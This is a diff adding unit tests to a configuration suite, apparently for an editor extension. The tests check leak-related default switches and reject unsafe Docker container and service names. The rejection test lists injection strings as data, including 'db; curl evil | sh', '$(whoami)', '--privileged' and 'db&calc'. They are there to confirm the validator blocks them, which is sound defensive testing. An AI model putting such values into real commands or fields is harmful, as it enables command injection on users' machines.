@@ -63,6 +63,38 @@ suite('config', () => {
 		assert.strictEqual(config.envFile, '.env');
 	});
 
+	test('reads the leak-related switches, all on by default', () => {
+		const defaults = read({}).config;
+		assert.deepStrictEqual(
+			[defaults.loadEnvFileIntoTerminals, defaults.applyToDebugSessions, defaults.echoCommands, defaults.database.autoStartContainer, defaults.database.warnIfPortExposed],
+			[true, true, true, true, true],
+		);
+		const { config, problems } = read({
+			loadEnvFileIntoTerminals: false,
+			applyToDebugSessions: false,
+			echoCommands: false,
+			'database.autoStartContainer': false,
+			'database.warnIfPortExposed': false,
+		});
+		assert.deepStrictEqual(problems, []);
+		assert.deepStrictEqual(
+			[config.loadEnvFileIntoTerminals, config.applyToDebugSessions, config.echoCommands, config.database.autoStartContainer, config.database.warnIfPortExposed],
+			[false, false, false, false, false],
+		);
+	});
+
+	test('rejects Docker names that could inject shell or docker arguments', () => {
+		for (const name of ['db; curl evil | sh', '--privileged', 'a b', '$(whoami)', 'db&calc']) {
+			const { config, problems } = read({ 'database.dockerContainer': name, 'database.dockerComposeService': name });
+			assert.strictEqual(config.database.dockerContainer, '', name);
+			assert.strictEqual(config.database.dockerComposeService, '', name);
+			assert.strictEqual(problems.length, 2, problems.join('\n'));
+			assert.match(problems[0], /database\.dockerContainer: .* isn't a valid name/);
+		}
+		assert.strictEqual(read({ 'database.dockerContainer': 'carli-db-1' }).config.database.dockerContainer, 'carli-db-1');
+		assert.strictEqual(read({ 'database.dockerComposeService': 'my_db.2' }).config.database.dockerComposeService, 'my_db.2');
+	});
+
 	test('an empty URL variable list falls back to the default', () => {
 		assert.deepStrictEqual(read({ 'database.urlVariables': [] }).config.database.urlVariables, ['DATABASE_URL']);
 	});
